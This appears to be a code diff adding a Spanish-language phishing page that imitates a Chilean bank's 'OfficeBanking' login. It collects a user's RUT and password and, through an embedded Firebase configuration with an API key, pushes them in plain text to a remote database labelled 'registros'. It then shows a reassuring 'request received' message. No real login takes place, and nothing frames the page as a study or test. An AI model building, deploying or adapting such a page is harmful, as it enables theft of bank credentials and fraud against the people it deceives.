@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ingreso a OfficeBanking</title>
+
+  <!-- Estilos simples para ejemplo -->
+  <style>
+    body {
+      background: #fff;
+      font-family: Arial;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .form-container {
+      border: 2px solid red;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    input {
+      width: 90%;
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background: red;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Ingreso a <span style="color: black;">Office</span><span style="background: red; color: white; padding: 2px 5px;">Banking</span></h2>
+    <input type="text" id="rut" placeholder="RUT" />
+    <div style="position: relative;">
+      <input type="password" id="clave" placeholder="Contraseña" style="width: 100%;" />
+      <span onclick="toggleClave()" style="position: absolute; right: 10px; top: 12px; cursor: pointer;">👁️</span>
+    </div>
+    <button onclick="enviarDatos()">Enviar</button>
+    <p id="mensaje"></p>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <script>
+    // 🔧 CONFIGURACIÓN DE TU PROYECTO FIREBASE
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+
+    // 🚀 INICIALIZAR FIREBASE
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 👁️ Toggle para mostrar/ocultar contraseña
+    function toggleClave() {
+      const clave = document.getElementById("clave");
+      clave.type = clave.type === "password" ? "text" : "password";
+    }
+
+    // ✅ Enviar datos a Firebase
+    function enviarDatos() {
+      const rut = document.getElementById("rut").value.trim();
+      const clave = document.getElementById("clave").value.trim();
+
+      if (!rut || !clave) {
+        document.getElementById("mensaje").textContent = "Por favor ingresa todos los datos.";
+        document.getElementById("mensaje").style.color = "red";
+        return;
+      }
+
+      const datos = {
+        rut,
+        clave,
+        fecha: new Date().toLocaleString()
+      };
+
+      db.ref("registros").push(datos)
+        .then(() => {
+          document.getElementById("mensaje").textContent = "Hemos recibido tu solicitud correctamente.";
+          document.getElementById("mensaje").style.color = "green";
+        })
+        .catch(error => {
+          document.getElementById("mensaje").textContent = "Error al enviar: " + error.message;
+          document.getElementById("mensaje").style.color = "red";
+        });
+    }
+  </script>
+</body>
+</html>
